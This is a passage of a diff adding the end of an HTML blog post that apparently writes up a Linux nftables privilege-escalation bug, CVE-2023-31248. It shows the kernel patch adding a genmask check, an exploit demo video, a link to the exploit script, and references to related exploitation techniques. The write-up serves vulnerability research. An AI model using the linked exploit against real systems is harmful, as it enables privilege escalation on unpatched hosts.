+</span></span><span style="display:flex;"><span> static struct nft_chain *nft_chain_lookup_byid(const struct net *net,
+</span></span><span style="display:flex;"><span> 					       const struct nft_table *table,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-					       const struct nlattr *nla)
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+					       const struct nlattr *nla, u8 genmask)
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> {
+</span></span><span style="display:flex;"><span> 	struct nftables_pernet *nft_net = nft_pernet(net);
+</span></span><span style="display:flex;"><span> 	u32 id = ntohl(nla_get_be32(nla));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -2705,7 +2705,8 @@ static struct nft_chain *nft_chain_lookup_byid(const struct net *net,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
+</span></span><span style="display:flex;"><span> 		if (trans-&gt;msg_type == NFT_MSG_NEWCHAIN &amp;&amp;
+</span></span><span style="display:flex;"><span> 		    chain-&gt;table == table &amp;&amp;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-		    id == nft_trans_chain_id(trans))
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+		    id == nft_trans_chain_id(trans) &amp;&amp;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+		    nft_active_genmask(chain, genmask))
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> 			return chain;
+</span></span><span style="display:flex;"><span> 	}
+</span></span><span style="display:flex;"><span> 	return ERR_PTR(-ENOENT);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -3809,7 +3810,8 @@ static int nf_tables_newrule(struct sk_buff *skb, const struct nfnl_info *info,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 			return -EOPNOTSUPP;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> 	} else if (nla[NFTA_RULE_CHAIN_ID]) {
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-		chain = nft_chain_lookup_byid(net, table, nla[NFTA_RULE_CHAIN_ID]);
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+		chain = nft_chain_lookup_byid(net, table, nla[NFTA_RULE_CHAIN_ID],
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+					      genmask);
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> 		if (IS_ERR(chain)) {
+</span></span><span style="display:flex;"><span> 			NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN_ID]);
+</span></span><span style="display:flex;"><span> 			return PTR_ERR(chain);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -10502,7 +10504,8 @@ static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 						 genmask);
+</span></span><span style="display:flex;"><span> 		} else if (tb[NFTA_VERDICT_CHAIN_ID]) {
+</span></span><span style="display:flex;"><span> 			chain = nft_chain_lookup_byid(ctx-&gt;net, ctx-&gt;table,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-						      tb[NFTA_VERDICT_CHAIN_ID]);
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+						      tb[NFTA_VERDICT_CHAIN_ID],
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+						      genmask);
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> 			if (IS_ERR(chain))
+</span></span><span style="display:flex;"><span> 				return PTR_ERR(chain);
+</span></span><span style="display:flex;"><span> 		} else {
+</span></span></code></pre></div><h4 id="exploit-demo">Exploit Demo</h4>
+<p>Here is a demonstration of the exploit in action:</p>
+<iframe width="800" height="540" src="https://www.youtube.com/embed/SVcfFV06Mdo?si=Mtz_Epgw81Uh-hqj" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+<p>The exploit script can be obtained <a href="https://github.com/star-sg/CVE/tree/master/CVE-2023-31248">here</a>.</p>
+<h4 id="acknowledgements">Acknowledgements</h4>
+<p>I would like to thank my mentor Billy for teaching me so many cool techniques and guiding me, Jacob for giving me this internship opportunity, and everyone else at Star Labs! :D</p>
+<h4 id="references-and-credits">References and Credits</h4>
+<ol>
+<li>Mingi Cho of Theori for reporting CVE-2023-31248</li>
+<li>David Bouman for his article on nftables and for the helper library functions <a href="https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/">https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/</a></li>
+<li>Bien Pham for stabilizing the race condition with audit and for the validate ops idea <a href="https://github.com/kungfulon/nf-tables-lpe/tree/master/chain-active">https://github.com/kungfulon/nf-tables-lpe/tree/master/chain-active</a></li>
+<li>Elixir Bootlin for the kernel source code <a href="https://elixir.bootlin.com/linux/v6.2/source/net/netfilter/nf_tables_api.c">https://elixir.bootlin.com/linux/v6.2/source/net/netfilter/nf_tables_api.c</a></li>
+<li>Andy Nguyen for msg_msg tricks <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</a></li>
+</ol>
+
+    <h4><a href="https://kaligulaarmblessed.github.io">Back to Home</a></h4>
+</div>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+&copy; 
+
+    Kaligula Armblessed
+
+<span id="thisyear">2023</span>
+
+
+        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
+
+</p>
+    <p class="text-center">
+        
+        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
+        
+        <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<script src="/js/jquery.js"></script>
+<script src="/js/bootstrap-386.js"></script>
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: true , 
+        speedFactor: 1 
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script></html>
